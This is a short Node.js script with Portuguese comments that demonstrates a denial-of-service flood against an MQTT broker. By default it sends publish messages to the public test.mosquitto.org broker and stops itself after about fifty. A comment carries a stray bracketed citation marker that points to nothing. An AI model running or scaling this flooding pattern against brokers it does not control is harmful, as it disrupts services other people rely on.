// flood_publish.js
// Este script demonstra um ataque de negação de serviço (DoS) simples contra um
// broker MQTT ao enviar mensagens em alta frequência, saturando o broker com
// publicações. Conforme documentado, o envio de mensagens acima da capacidade
// do broker pode causar degradação de desempenho, perda de mensagens ou até
// travamentos【324066931876535†L62-L89】. Use este script apenas em ambientes de
// teste e com taxas baixas para não prejudicar brokers públicos.
//
// Uso:
//   node flood_publish.js [brokerUrl] [topic] [interval_ms]
//   - brokerUrl: endereço do broker MQTT (padrão: mqtt://test.mosquitto.org)
//   - topic: tópico para publicar (padrão: "topico/unico/dupla")
//   - interval_ms: intervalo em milissegundos entre mensagens (padrão: 100)

const mqtt = require('mqtt');
const { randomUUID } = require('crypto');

const brokerUrl = process.argv[2] || 'mqtt://test.mosquitto.org';
const topic = process.argv[3] || 'topico/unico/dupla';
const intervalMs = parseInt(process.argv[4] || '100', 10);

const clientId = `flood_${randomUUID()}`;
const client = mqtt.connect(brokerUrl, { clientId, clean: true });

client.on('connect', () => {
  console.log(`Iniciando flood no tópico '${topic}' (intervalo: ${intervalMs}ms)`);
  let counter = 0;
  const timer = setInterval(() => {
    const msg = `flood message #${counter++}`;
    client.publish(topic, msg, { qos: 0 }, (err) => {
      if (err) console.error('Erro no publish:', err.message);
    });
    // para encerrar automaticamente após 50 mensagens para evitar sobrecarga
    if (counter > 50) {
      clearInterval(timer);
      console.log('Flood concluído, encerrando cliente.');
      client.end();
    }
  }, intervalMs);
});

client.on('error', (err) => {
  console.error('Erro de conexão:', err.message);
});